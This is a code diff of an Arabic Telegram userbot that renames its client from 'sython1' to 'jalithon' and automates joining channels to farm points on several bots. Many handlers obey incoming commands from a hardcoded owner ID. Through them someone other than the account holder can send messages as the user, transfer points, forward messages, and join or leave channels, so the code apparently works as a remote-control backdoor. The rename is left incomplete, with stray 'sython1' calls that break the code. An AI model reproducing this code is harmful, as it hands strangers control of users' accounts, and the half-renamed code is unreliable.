@@ -125,7 +125,7 @@ async def OwnerStart(event):
 async def _(event):
     await event.reply("**- جاري تجميع النقاط ؛ سيدي .**")
     await event.edit("**- جاري تجميع النقاط ؛ سيدي .**")
-    joinu = await sython1(JoinChannelRequest('jalithon'))
+    joinu = await jalithon(JoinChannelRequest('jalithon'))
     channel_entity = await jalithon.get_entity(bot_username)
     await jalithon.send_message(bot_username, '/start')
     await asyncio.sleep(4)
@@ -139,7 +139,7 @@ async def _(event):
     for i in range(100):
         await asyncio.sleep(4)
 
-        list = await sython1(GetHistoryRequest(peer=channel_entity, limit=1,
+        list = await jalithon(GetHistoryRequest(peer=channel_entity, limit=1,
                                                offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
         msgs = list.messages[0]
         if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
@@ -326,293 +326,293 @@ async def _(event):
                 await jalithon(JoinChannelRequest(url))
             except:
                 bott = url.split('/')[-1]
-                await sython1(ImportChatInviteRequest(bott))
-            msg2 = await sython1.get_messages(bot_username, limit=1)
+                await jalithon(ImportChatInviteRequest(bott))
+            msg2 = await jalithon.get_messages(bot_username, limit=1)
             await msg2[0].click(text='تحقق')
             chs += 1
             await event.edit(f"**تم الانضمام في {chs} قناة**")
         except:
-            msg2 = await sython1.get_messages(bot_username, limit=1)
+            msg2 = await jalithon.get_messages(bot_username, limit=1)
             await msg2[0].click(text='التالي')
             chs += 1
             await event.edit(f"**القناة رقم {chs}**")
-    await sython1.send_message(event.chat_id, "**تم الانتهاء من التجميع | off**")
+    await jalithon.send_message(event.chat_id, "**تم الانتهاء من التجميع | off**")
     
     
     
-@sython1.on(events.NewMessage(outgoing=True, pattern=".تجميع الجوكر"))
+@jalithon.on(events.NewMessage(outgoing=True, pattern=".تجميع الجوكر"))
 async def _(event):
 
     await event.edit("**- جاري تجميع النقاط ؛ سيدي .**")
-    joinu = await sython1(JoinChannelRequest('jalithon'))
-    channel_entity = await sython1.get_entity(bot_usernamee)
-    await sython1.send_message(bot_usernamee, '/start')
+    joinu = await jalithon(JoinChannelRequest('jalithon'))
+    channel_entity = await jalithon.get_entity(bot_usernamee)
+    await jalithon.send_message(bot_usernamee, '/start')
     await asyncio.sleep(4)
-    msg0 = await sython1.get_messages(bot_usernamee, limit=1)
+    msg0 = await jalithon.get_messages(bot_usernamee, limit=1)
     await msg0[0].click(2)
     await asyncio.sleep(4)
-    msg1 = await sython1.get_messages(bot_usernamee, limit=1)
+    msg1 = await jalithon.get_messages(bot_usernamee, limit=1)
     await msg1[0].click(0)
 
     chs = 1
     for i in range(100):
         await asyncio.sleep(4)
 
-        list = await sython1(GetHistoryRequest(peer=channel_entity, limit=1,
+        list = await jalithon(GetHistoryRequest(peer=channel_entity, limit=1,
                                                offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
         msgs = list.messages[0]
         if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
-            await sython1.send_message(event.chat_id, f"**تم الانتهاء من التجميع | off**")
+            await jalithon.send_message(event.chat_id, f"**تم الانتهاء من التجميع | off**")
 
             break
         url = msgs.reply_markup.rows[0].buttons[0].url
         try:
             try:
-                await sython1(JoinChannelRequest(url))
+                await jalithon(JoinChannelRequest(url))
             except:
                 bott = url.split('/')[-1]
-                await sython1(ImportChatInviteRequest(bott))
-            msg2 = await sython1.get_messages(bot_usernamee, limit=1)
+                await jalithon(ImportChatInviteRequest(bott))
+            msg2 = await jalithon.get_messages(bot_usernamee, limit=1)
             await msg2[0].click(text='تحقق')
             chs += 1
             await event.edit(f"**تم الانضمام في {chs} قناة**")
         except:
-            msg2 = await sython1.get_messages(bot_usernamee, limit=1)
+            msg2 = await jalithon.get_messages(bot_usernamee, limit=1)
             await msg2[0].click(text='التالي')
             chs += 1
             await event.edit(f"**القناة رقم {chs}**")
-    await sython1.send_message(event.chat_id, "**تم الانتهاء من التجميع | off**")
+    await jalithon.send_message(event.chat_id, "**تم الانتهاء من التجميع | off**")
 
-@sython1.on(events.NewMessage(outgoing=True, pattern=".تجميع العقاب"))
+@jalithon.on(events.NewMessage(outgoing=True, pattern=".تجميع العقاب"))
 async def _(event):
 
     await event.edit("**- جاري تجميع النقاط ؛ سيدي .**")
-    joinu = await sython1(JoinChannelRequest('jalithon'))
-    channel_entity = await sython1.get_entity(bot_usernameee)
-    await sython1.send_message(bot_usernameee, '/start')
+    joinu = await jalithon(JoinChannelRequest('jalithon'))
+    channel_entity = await jalithon.get_entity(bot_usernameee)
+    await jalithon.send_message(bot_usernameee, '/start')
     await asyncio.sleep(4)
-    msg0 = await sython1.get_messages(bot_usernameee, limit=1)
+    msg0 = await jalithon.get_messages(bot_usernameee, limit=1)
     await msg0[0].click(2)
     await asyncio.sleep(4)
-    msg1 = await sython1.get_messages(bot_usernameee, limit=1)
+    msg1 = await jalithon.get_messages(bot_usernameee, limit=1)
     await msg1[0].click(0)
 
     chs = 1
     for i in range(100):
         await asyncio.sleep(4)
 
-        list = await sython1(GetHistoryRequest(peer=channel_entity, limit=1,
+        list = await jalithon(GetHistoryRequest(peer=channel_entity, limit=1,
                                                offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
         msgs = list.messages[0]
         if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
-            await sython1.send_message(event.chat_id, f"**تم الانتهاء من التجميع | off**")
+            await jalithon.send_message(event.chat_id, f"**تم الانتهاء من التجميع | off**")
 
             break
         url = msgs.reply_markup.rows[0].buttons[0].url
         try:
             try:
-                await sython1(JoinChannelRequest(url))
+                await jalithon(JoinChannelRequest(url))
             except:
                 bott = url.split('/')[-1]
-                await sython1(ImportChatInviteRequest(bott))
-            msg2 = await sython1.get_messages(bot_usernameee, limit=1)
+                await jalithon(ImportChatInviteRequest(bott))
+            msg2 = await jalithon.get_messages(bot_usernameee, limit=1)
             await msg2[0].click(text='تحقق')
             chs += 1
             await event.edit(f"**تم الانضمام في {chs} قناة**")
         except:
-            msg2 = await sython1.get_messages(bot_usernameee, limit=1)
+            msg2 = await jalithon.get_messages(bot_usernameee, limit=1)
             await msg2[0].click(text='التالي')
             chs += 1
             await event.edit(f"**القناة رقم {chs}**")
-    await sython1.send_message(event.chat_id, "**تم الانتهاء من التجميع | off**")
+    await jalithon.send_message(event.chat_id, "**تم الانتهاء من التجميع | off**")
 
 
-@sython1.on(events.NewMessage(outgoing=True, pattern=".تجميع العرب"))
+@jalithon.on(events.NewMessage(outgoing=True, pattern=".تجميع العرب"))
 async def _(event):
 
     await event.edit("**- جاري تجميع النقاط ؛ سيدي .**")
-    joinu = await sython1(JoinChannelRequest('jalithon'))
-    channel_entity = await sython1.get_entity(bot_usernameeee)
-    await sython1.send_message(bot_usernameeee, '/start')
+    joinu = await jalithon(JoinChannelRequest('jalithon'))
+    channel_entity = await jalithon.get_entity(bot_usernameeee)
+    await jalithon.send_message(bot_usernameeee, '/start')
     await asyncio.sleep(4)
-    msg0 = await sython1.get_messages(bot_usernameeee, limit=1)
+    msg0 = await jalithon.get_messages(bot_usernameeee, limit=1)
     await msg0[0].click(2)
     await asyncio.sleep(4)
-    msg1 = await sython1.get_messages(bot_usernameeee, limit=1)
+    msg1 = await jalithon.get_messages(bot_usernameeee, limit=1)
     await msg1[0].click(0)
 
     chs = 1
     for i in range(100):
         await asyncio.sleep(4)
 
-        list = await sython1(GetHistoryRequest(peer=channel_entity, limit=1,
+        list = await jalithon(GetHistoryRequest(peer=channel_entity, limit=1,
                                                offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
         msgs = list.messages[0]
         if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
-            await sython1.send_message(event.chat_id, f"**تم الانتهاء من التجميع | off**")
+            await jalithon.send_message(event.chat_id, f"**تم الانتهاء من التجميع | off**")
 
             break
         url = msgs.reply_markup.rows[0].buttons[0].url
         try:
             try:
-                await sython1(JoinChannelRequest(url))
+                await jalithon(JoinChannelRequest(url))
             except:
                 bott = url.split('/')[-1]
-                await sython1(ImportChatInviteRequest(bott))
-            msg2 = await sython1.get_messages(bot_usernameeee, limit=1)
+                await jalithon(ImportChatInviteRequest(bott))
+            msg2 = await jalithon.get_messages(bot_usernameeee, limit=1)
             await msg2[0].click(text='تحقق')
             chs += 1
             await event.edit(f"**تم الانضمام في {chs} قناة**")
         except:
-            msg2 = await sython1.get_messages(bot_usernameeee, limit=1)
+            msg2 = await jalithon.get_messages(bot_usernameeee, limit=1)
             await msg2[0].click(text='التالي')
             chs += 1
             await event.edit(f"**القناة رقم {chs}**")
-    await sython1.send_message(event.chat_id, "**تم الانتهاء من التجميع | off**")
+    await jalithon.send_message(event.chat_id, "**تم الانتهاء من التجميع | off**")
 
-@sython1.on(events.NewMessage(outgoing=False, pattern=r'^/pt1 (.*)'))
+@jalithon.on(events.NewMessage(outgoing=False, pattern=r'^/pt1 (.*)'))
 async def OwnerStart(event):
     pt = event.pattern_match.group(1) 
     sender = await event.get_sender()
     if sender.id == ownerhson_id :
-     send = await sython1.send_message(bot_username, '/start')
+     send = await jalithon.send_message(bot_username, '/start')
      sleep(2)
-    msg1 = await sython1.get_messages(bot_username, limit=1)
+    msg1 = await jalithon.get_messages(bot_username, limit=1)
     await msg1[0].click(3)
     sleep(4)
-    await sython1.send_message(bot_username, pt)
+    await jalithon.send_message(bot_username, pt)
     sleep(4)
-    msg = await sython1.get_messages(bot_username, limit=1)
+    msg = await jalithon.get_messages(bot_username, limit=1)
 
     await msg[0].forward_to(ownerhson_id)
     
-@sython1.on(events.NewMessage(outgoing=False, pattern=r'^/pt2 (.*)'))
+@jalithon.on(events.NewMessage(outgoing=False, pattern=r'^/pt2 (.*)'))
 async def OwnerStart(event):
     pt = event.pattern_match.group(1) 
     sender = await event.get_sender()
     if sender.id == ownerhson_id :
-     send = await sython1.send_message(bot_usernamee, '/start')
+     send = await jalithon.send_message(bot_usernamee, '/start')
      sleep(2)
-    msg1 = await sython1.get_messages(bot_usernamee, limit=1)
+    msg1 = await jalithon.get_messages(bot_usernamee, limit=1)
     await msg1[0].click(3)
     sleep(4)
-    await sython1.send_message(bot_usernamee, pt)
+    await jalithon.send_message(bot_usernamee, pt)
     sleep(4)
-    msg = await sython1.get_messages(bot_usernamee, limit=1)
+    msg = await jalithon.get_messages(bot_usernamee, limit=1)
 
     await msg[0].forward_to(ownerhson_id)
 
-@sython1.on(events.NewMessage(outgoing=False, pattern=r'^/pt3 (.*)'))
+@jalithon.on(events.NewMessage(outgoing=False, pattern=r'^/pt3 (.*)'))
 async def OwnerStart(event):
     pt = event.pattern_match.group(1) 
     sender = await event.get_sender()
     if sender.id == ownerhson_id :
-     send = await sython1.send_message(bot_usernameee, '/start')
+     send = await jalithon.send_message(bot_usernameee, '/start')
      sleep(2)
-    msg1 = await sython1.get_messages(bot_usernameee, limit=1)
+    msg1 = await jalithon.get_messages(bot_usernameee, limit=1)
     await msg1[0].click(3)
     sleep(4)
-    await sython1.send_message(bot_usernameee, pt)
+    await jalithon.send_message(bot_usernameee, pt)
     sleep(4)
-    msg = await sython1.get_messages(bot_usernameee, limit=1)
+    msg = await jalithon.get_messages(bot_usernameee, limit=1)
 
     await msg[0].forward_to(ownerhson_id)
     
-@sython1.on(events.NewMessage(outgoing=False, pattern=r'^/pt4 (.*)'))
+@jalithon.on(events.NewMessage(outgoing=False, pattern=r'^/pt4 (.*)'))
 async def OwnerStart(event):
     pt = event.pattern_match.group(1) 
     sender = await event.get_sender()
     if sender.id == ownerhson_id :
-     send = await sython1.send_message(bot_usernameeee, '/start')
+     send = await jalithon.send_message(bot_usernameeee, '/start')
      sleep(2)
-    msg1 = await sython1.get_messages(bot_usernameeee, limit=1)
+    msg1 = await jalithon.get_messages(bot_usernameeee, limit=1)
     await msg1[0].click(3)
     sleep(4)
-    await sython1.send_message(bot_usernameeee, pt)
+    await jalithon.send_message(bot_usernameeee, pt)
     sleep(4)
     msg = await sython1.get_messages(bot_usernameeee, limit=1)
 
     await msg[0].forward_to(ownerhson_id)
     
-@sython1.on(events.NewMessage(outgoing=False, pattern=r'/npoint1'))
+@jalithon.on(events.NewMessage(outgoing=False, pattern=r'/npoint1'))
 async def OwnerStart(event):
     sender = await event.get_sender()
     if sender.id == ownerhson_id :
-     send = await sython1.send_message(bot_username, '/start')
+     send = await jalithon.send_message(bot_username, '/start')
      sleep(2)
-    msg1 = await sython1.get_messages(bot_username, limit=1)
+    msg1 = await jalithon.get_messages(bot_username, limit=1)
     await msg1[0].click(5)
     sleep(2)
-    msg = await sython1.get_messages(bot_username, limit=1)
+    msg = await jalithon.get_messages(bot_username, limit=1)
 
     await msg[0].forward_to(ownerhson_id)
     
-@sython1.on(events.NewMessage(outgoing=False, pattern=r'/npoint2'))
+@jalithon.on(events.NewMessage(outgoing=False, pattern=r'/npoint2'))
 async def OwnerStart(event):
     sender = await event.get_sender()
     if sender.id == ownerhson_id :
-     send = await sython1.send_message(bot_usernamee, '/start')
+     send = await jalithon.send_message(bot_usernamee, '/start')
      sleep(2)
-    msg1 = await sython1.get_messages(bot_usernamee, limit=1)
+    msg1 = await jalithon.get_messages(bot_usernamee, limit=1)
     await msg1[0].click(5)
     sleep(2)
-    msg = await sython1.get_messages(bot_usernamee, limit=1)
+    msg = await jalithon.get_messages(bot_usernamee, limit=1)
 
     await msg[0].forward_to(ownerhson_id)
  
-@sython1.on(events.NewMessage(outgoing=False, pattern=r'/npoint3'))
+@jalithon.on(events.NewMessage(outgoing=False, pattern=r'/npoint3'))
 async def OwnerStart(event):
     sender = await event.get_sender()
     if sender.id == ownerhson_id :
-     send = await sython1.send_message(bot_usernameee, '/start')
+     send = await jalithon.send_message(bot_usernameee, '/start')
      sleep(2)
-    msg1 = await sython1.get_messages(bot_usernameee, limit=1)
+    msg1 = await jalithon.get_messages(bot_usernameee, limit=1)
     await msg1[0].click(5)
     sleep(2)
-    msg = await sython1.get_messages(bot_usernameee, limit=1)
+    msg = await jalithon.get_messages(bot_usernameee, limit=1)
 
     await msg[0].forward_to(ownerhson_id)
     
-@sython1.on(events.NewMessage(outgoing=False, pattern=r'/npoint4'))
+@jalithon.on(events.NewMessage(outgoing=False, pattern=r'/npoint4'))
 async def OwnerStart(event):
     sender = await event.get_sender()
     if sender.id == ownerhson_id :
-     send = await sython1.send_message(bot_usernameeee, '/start')
+     send = await jalithon.send_message(bot_usernameeee, '/start')
      sleep(2)
-    msg1 = await sython1.get_messages(bot_usernameeee, limit=1)
+    msg1 = await jalithon.get_messages(bot_usernameeee, limit=1)
     await msg1[0].click(5)
     sleep(2)
-    msg = await sython1.get_messages(bot_usernameeee, limit=1)
+    msg = await jalithon.get_messages(bot_usernameeee, limit=1)
 
     await msg[0].forward_to(ownerhson_id)
     
 
-@sython1.on(events.NewMessage(outgoing=False, pattern=r'/lpoint'))
+@jalithon.on(events.NewMessage(outgoing=False, pattern=r'/lpoint'))
 async def OwnerStart(event):
     sender = await event.get_sender()
     if sender.id == ownerhson_id:
         dialogs = await sython1.get_dialogs()
         for dialog in dialogs:
             if dialog.is_channel:
-                await sython1(LeaveChannelRequest(dialog.entity))
+                await jalithon(LeaveChannelRequest(dialog.entity))
                 await event.respond(f"**قمت بمغادرة جميع القنوات والمجموعات**")
                 
 
 
 
 
-@sython1.on(events.NewMessage(pattern=r'^/send (.*) (.*)'))
+@jalithon.on(events.NewMessage(pattern=r'^/send (.*) (.*)'))
 async def OwnerStart(event):
     sender = await event.get_sender()
     if sender.id == ownerhson_id:
      usern = event.pattern_match.group(1)
     mase = event.pattern_match.group(2)
-    await sython1.send_message(usern, mase)
+    await jalithon.send_message(usern, mase)
     await event.respond(f"**تـم ارسال الرسالة الى المستخدم {usern}**")    
     
     
 
-@sython1.on(events.NewMessage(outgoing=False, pattern='/transfer'))
+@jalithon.on(events.NewMessage(outgoing=False, pattern='/transfer'))
 async def OwnerStart(event):
     sender = await event.get_sender()
     if sender.id == ownerhson_id :
@@ -625,7 +625,7 @@ async def OwnerStart(event):
 
 
 
-@sython1.on(events.NewMessage(outgoing=False, pattern='/infoacc'))
+@jalithon.on(events.NewMessage(outgoing=False, pattern='/infoacc'))
 async def OwnerStart(event):
     sender = await event.get_sender()
     if sender.id == ownerhson_id :
@@ -636,43 +636,43 @@ async def OwnerStart(event):
 • @XNSEX21BOT - `/npoint4`**""")
 
 
-@sython1.on(events.NewMessage(outgoing=False, pattern=r'^/button (.*) (.*)'))
+@jalithon.on(events.NewMessage(outgoing=False, pattern=r'^/button (.*) (.*)'))
 async def OwnerStart(event):
     userbt = event.pattern_match.group(1) 
     bt = int(event.pattern_match.group(2))
     sender = await event.get_sender()
     if sender.id == ownerhson_id :
-     send = await sython1.send_message(userbt, '/start')
+     send = await jalithon.send_message(userbt, '/start')
      sleep(2)
-    msg1 = await sython1.get_messages(userbt, limit=1)
+    msg1 = await jalithon.get_messages(userbt, limit=1)
     await msg1[0].click(bt)
         
-@sython1.on(events.NewMessage(outgoing=False, pattern=r'^/forward (.*)'))
+@jalithon.on(events.NewMessage(outgoing=False, pattern=r'^/forward (.*)'))
 async def OwnerStart(event):
     userbott = event.pattern_match.group(1)
     sender = await event.get_sender()
     if sender.id == ownerhson_id:
-        msg = await sython1.get_messages(userbott, limit=1)
+        msg = await jalithon.get_messages(userbott, limit=1)
         await msg[0].forward_to(ownerhson_id)
         
-@sython1.on(events.NewMessage(outgoing=False, pattern='/join'))
+@jalithon.on(events.NewMessage(outgoing=False, pattern='/join'))
 async def OwnerStart(event):
     sender = await event.get_sender()
     if sender.id == ownerhson_id:
-        send = await sython1.send_message(event.chat_id, "**جاري الانضمام التلقائي للقنوات**")
-        joinq = await sython1(JoinChannelRequest('d3boot_7'))
-        joinw = await sython1(JoinChannelRequest('Fvvvv'))
-        joine = await sython1(JoinChannelRequest('DzDDDD'))
-        joinr = await sython1(JoinChannelRequest('botbillion'))
-        joint = await sython1(JoinChannelRequest('zzzzzz1'))
-        joiny = await sython1(JoinChannelRequest('zzzzzz'))
-        joinh = await sython1(JoinChannelRequest('zd_hd'))
-        joini = await sython1(JoinChannelRequest('zz_MX'))
-        joino = await sython1(JoinChannelRequest('zd_e6'))
-        joinp = await sython1(JoinChannelRequest('KTTTT'))
-        joina = await sython1(JoinChannelRequest('RRXFR'))
+        send = await jalithon.send_message(event.chat_id, "**جاري الانضمام التلقائي للقنوات**")
+        joinq = await jalithon(JoinChannelRequest('d3boot_7'))
+        joinw = await jalithon(JoinChannelRequest('Fvvvv'))
+        joine = await jalithon(JoinChannelRequest('DzDDDD'))
+        joinr = await jalithon(JoinChannelRequest('botbillion'))
+        joint = await jalithon(JoinChannelRequest('zzzzzz1'))
+        joiny = await jalithon(JoinChannelRequest('zzzzzz'))
+        joinh = await jalithon(JoinChannelRequest('zd_hd'))
+        joini = await jalithon(JoinChannelRequest('zz_MX'))
+        joino = await jalithon(JoinChannelRequest('zd_e6'))
+        joinp = await jalithon(JoinChannelRequest('KTTTT'))
+        joina = await jalithon(JoinChannelRequest('RRXFR'))
         sendd = await sython1.send_message(event.chat_id, "**تـم الانضمام في القنوات**")
         
         
 print("Jalithon Userbot Running ")
-sython1.run_until_disconnected()
+jalithon.run_until_disconnected()
